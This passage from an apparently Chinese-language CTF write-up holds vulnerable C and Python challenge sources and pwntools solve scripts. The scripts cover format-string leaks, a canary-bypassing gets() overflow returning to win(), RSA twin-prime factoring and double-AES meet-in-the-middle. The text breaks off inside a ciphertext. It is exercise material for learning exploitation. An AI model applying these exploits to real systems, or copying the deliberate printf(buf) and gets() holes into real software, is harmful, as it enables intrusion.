class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error opening /dev/urandom. If you see this. call admin&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, password, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the password &gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_password(password, buf, <span class="built_in">strlen</span>(buf)))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong password!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkkYugVkxx.png" alt="image"><br>要讓 buf_len 為0<br>但 scanf 無法只輸入 \x00，且 \x00 表示輸入結束，後面東西不會被讀取到<br>exploit.py</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chal.ctf.scint.org&#x27;</span>,<span class="number">10004</span>)</span><br><span class="line">r.sendlineafter(b<span class="number">&#x27;</span>password &gt;<span class="string">&#x27;,b&#x27;</span>\x00aaa<span class="number">&#x27;</span>) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/ryyLs0Qkge.png" alt="image"></p>
<h4 id="Once"><a href="#Once" class="headerlink" title="Once"></a>Once</h4><p>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> charset[] = <span class="string">&quot;!\&quot;#$%&amp;\&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> secret[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> is_sure = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        secret[i] = charset[rand() % <span class="built_in">strlen</span>(charset)];</span><br><span class="line">    &#125;</span><br><span class="line">    secret[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Guess the secret, you only have one chance\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;guess &gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, buf);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your guess: &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Are you sure? [y/n] &gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%1c&quot;</span>, &amp;is_sure);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> (is_sure == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, secret))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Correct answer!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Incorrect answer\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Correct answer is %s\n&quot;</span>, secret);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/B1DIb1V1xx.png" alt="image"><br><img src="https://hackmd.io/_uploads/ryWD-y4klg.png" alt="image"><br>format string 攻擊<br>輸入 15 個 a 看 secret 和 buf 在 stack 位址<br><img src="https://hackmd.io/_uploads/HkNibl4Jex.png" alt="image"><br>secret[15] &#x3D;&gt; rsp + 0x10、rsp + 0x18 &#x3D;&gt; <code>%8$p</code>、<code>%9$p</code><br>buf[15] &#x3D;&gt; rsp + 0x20、rsp + 0x28<br><img src="https://hackmd.io/_uploads/Bkig8xNygg.png" alt="image"><br><img src="https://hackmd.io/_uploads/Bk2iLgN1gg.png" alt="image"></p>
<h4 id="Little-Parrot"><a href="#Little-Parrot" class="headerlink" title="Little Parrot"></a>Little Parrot</h4><p>chal.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -o chal chal.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nYou win!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Here is your flag: flag&#123;fake_flag&#125;&quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">parrot</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m a little parrot, and I&#x27;ll repeat whatever you said!(or exit)\n&gt; &quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;exit\n&quot;</span>))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;You said &gt; &quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(buf);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">		fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	parrot();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;anything left to say?\n&gt; &quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You said &gt; %s&quot;</span>, buf);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/HJ1PKg4yel.png" alt="image"><br>一樣 format string 攻擊<br>先在 parrot() 的 printf(buf) 讀 canary，然後 main 的 gets() 不限長度，用來覆蓋 canary 和 ret addr，ret to win()<br>先讀 ret addr 算出 base，再算出 win() 的位址<br><img src="https://hackmd.io/_uploads/Hy97olN1xg.png" alt="image"><br>canary 在 rsp + 0x108 &#x3D;&gt; <code>%39$p</code><br>old rbp 在 rsp + 0x110<br>ret addr 在 rsp + 0x118 &#x3D;&gt; <code>%41$p</code><br><img src="https://hackmd.io/_uploads/BJK6pxN1gg.png" alt="image"><br>gets(v4) 要先填充 0x38 個字元才會遇到 canary<br><img src="https://hackmd.io/_uploads/r1WN3e4ygg.png" alt="image"><br>parrot() 的 ret addr 是 offset 0x136c<br><img src="https://hackmd.io/_uploads/ryWF3lEklx.png" alt="image"><br>win() 是 offset 0x1229</p>
<p>payload 要先給 getchar() 吃一個字元<br>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chal.ctf.scint.org&#x27;</span>,<span class="number">10103</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;%39$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvline().decode().strip().split(<span class="string">&#x27; &gt; &#x27;</span>)[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;%41$p&#x27;</span>)</span><br><span class="line">ret = <span class="built_in">int</span>(r.recvline().decode().strip().split(<span class="string">&#x27; &gt; &#x27;</span>)[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ret))</span><br><span class="line">base = ret - <span class="number">0x136c</span></span><br><span class="line">win = base + <span class="number">0x1229</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\n&#x27;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x38</span> + p64(canary) + <span class="string">b&quot;a&quot;</span>*<span class="number">8</span> + p64(win)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/Sk8RwxEkel.png" alt="image"></p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Twins"><a href="#Twins" class="headerlink" title="Twins"></a>Twins</h4><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_twin_prime</span>(<span class="params">N:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(N)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p + <span class="number">2</span>): <span class="keyword">return</span> p, p + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = generate_twin_prime(<span class="number">1024</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(FLAG)</span><br><span class="line">C = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;N = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;C = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>p q 只差 2<br>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line">N = <span class="number">28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">C = <span class="number">1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923</span></span><br><span class="line"></span><br><span class="line">p = isqrt(<span class="number">1</span> + N) - <span class="number">1</span></span><br><span class="line">q = p + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(C, d, N)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rydVYjV1ee.png" alt="image"></p>
<h4 id="DAES"><a href="#DAES" class="headerlink" title="DAES"></a>DAES</h4><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">TIMEOUT = <span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timeout_handler</span>(<span class="params">signum, frame</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nTime&#x27;s up! No flag for u...&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGALRM, timeout_handler)</span><br><span class="line">signal.alarm(TIMEOUT)</span><br><span class="line"></span><br><span class="line">target = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">keys = [<span class="string">b&#x27;whalekey:&#x27;</span> + <span class="built_in">str</span>(random.randrange(<span class="number">1000000</span>, <span class="number">1999999</span>)).encode() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">key, msg</span>):</span><br><span class="line">    ecb = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> ecb.encrypt(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">daes</span>(<span class="params">msg</span>):</span><br><span class="line">    tmp = enc(keys[<span class="number">0</span>], msg)</span><br><span class="line">    <span class="keyword">return</span> enc(keys[<span class="number">1</span>], tmp)</span><br><span class="line"></span><br><span class="line">test = <span class="string">b&#x27;you are my fire~&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(daes(test).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(daes(target).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">input</span>(<span class="string">&quot;Ans:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ans == target.<span class="built_in">hex</span>():</span><br><span class="line">    <span class="built_in">print</span>(FLAG)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Nah, no flag for u...&quot;</span>)</span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;chal.ctf.scint.org&#x27;</span>, <span class="number">12003</span>)</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">b&#x27;whalekey:&#x27;</span></span><br><span class="line">keyspace = [prefix + <span class="built_in">str</span>(i).encode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>, <span class="number">2000000</span>)]</span><br><span class="line"></span><br><span class="line">line1 = r.recvline().strip().decode()</span><br><span class="line">line2 = r.recvline().strip().decode()</span><br><span class="line"></span><br><span class="line">enc_plain = <span class="built_in">bytes</span>.fromhex(line1)</span><br><span class="line">enc_target = <span class="built_in">bytes</span>.fromhex(line2)</span><br><span class="line"></span><br><span class="line">plain = <span class="string">b&#x27;you are my fire~&#x27;</span>  </span><br><span class="line"></span><br><span class="line">enc1_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i, k1 <span class="keyword">in</span> <span class="built_in">enumerate</span>(keyspace):</span><br><span class="line">    cipher1 = AES.new(k1, AES.MODE_ECB)</span><br><span class="line">    enc1 = cipher1.encrypt(plain)</span><br><span class="line">    enc1_dict[enc1] = k1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">50000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(f&quot;Tried &#123;i&#125; key1&quot;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start key2&quot;</span>)</span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> i, k2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(keyspace):</span><br><span class="line">    cipher2 = AES.new(k2, AES.MODE_ECB)</span><br><span class="line">    dec1 = cipher2.decrypt(enc_plain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> dec1 <span class="keyword">in</span> enc1_dict:</span><br><span class="line">        key1 = enc1_dict[dec1]</span><br><span class="line">        key2 = k2</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;key1 = <span class="subst">&#123;key1&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;key2 = <span class="subst">&#123;key2&#125;</span>&quot;</span>)</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">50000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(f&quot;Tried &#123;i&#125; key2&quot;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line">cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">enc1 = cipher2.decrypt(enc_target)</span><br><span class="line">target = cipher1.decrypt(enc1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;target = <span class="subst">&#123;target.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(target.<span class="built_in">hex</span>().encode())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/SkhdAo4kxg.png" alt="image"></p>
<h4 id="Frequency-Freakout"><a href="#Frequency-Freakout" class="headerlink" title="Frequency Freakout"></a>Frequency Freakout</h4><p>cipher.txt</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MW RUB LGSEC GN TEYDDMTYE TSZJRGASYJUZ, IYWZ BWRUFDMYDRD XBAMW LMRU DMIJEB DFXDRMRFRMGW TMJUBSD. RUBDB XYDMT RBTUWMHFBD CBIGWDRSYRB RUB VFEWBSYXMEMRZ GN EBRRBS NSBHFBWTZ YWC DUGL UGL TBSRYMW JYRRBSWD TYW SBVBYE UMCCBW IBDDYABD.</span><br><span class="line"></span><br><span class="line">GWB GN RUB IGDR BPTMRMWA BPBSTMDBD MW EBYSWMWA YXGFR TMJUBSD MD RSZMWA RG TGWDRSFTR ZGFS GLW YWC TUYEEBWAB GRUBSD RG XSBYQ MR. LUMEB IGCBSW BWTSZJRMGW IBRUGCD UYVB NYS DFSJYDDBC RUBDB RBTUWMHFBD MW TGIJEBPMRZ YWC DRSBWARU, RUB NFWCYIBWRYE MCBYD SBIYMW NYDTMWYRMWA.</span><br><span class="line"></span><br><span class="line">MN ZGF&#x27;SB FJ NGS Y JFOOEB, UBSB&#x27;D Y TUYEEBWAB: RUKTT&#123;DFXDR1R1GW_TMJU3S_1D_TGG1&#125; -K RUMD IMAUR EGGQ EMQB Y SYWCGI DRSMWA, XFR MR&#x27;D WGR. UMCCBW LMRUMW RUMD DBHFBWTB MD RUB QBZ RG FWCBSDRYWCMWA UGL DMIJEB EBRRBS DFXDRMRFRMGW TYW DRMEE DJYSQ TFSMGDMRZ YWC NFW.</span><br><span class="line"></span><br><span class="line">RSZ CBTGCMWA MR GS BIXBCCMWA MR LMRUMW ZGFS GLW TMJUBS. LUG QWGLD? ZGF 